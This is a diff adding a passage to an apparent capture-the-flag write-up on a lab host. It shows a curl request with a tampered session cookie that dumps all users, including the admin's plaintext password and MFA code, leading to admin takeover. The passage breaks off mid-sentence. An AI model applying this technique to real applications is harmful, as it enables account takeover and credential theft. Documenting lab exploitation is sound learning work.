@@ -234,4 +234,23 @@ curl http://verbose.hsm/api/users/all -H 'Cookie: session=eyJyb2xlIjoidXNlciIsIn
 
 Its now full account takeover
 
-I can now lo
+I can now login as the admin!
+
+But there is a prompt for MFA, ill then make the same curl request and get the mfa code
+
+```python
+  {
+    "email": "admin@hacksmarter.local",
+    "id": 3,
+    "mfa": "2294",
+    "password": "YouWontGetThisPasswordYouNoobLOL123",
+    "role": "admin",
+    "username": "admin"
+  },
+```
+
+I can now login
+
+![](Pasted%20image%2020260903134718.png)
+
+I am now logged in as admin and i have a root s
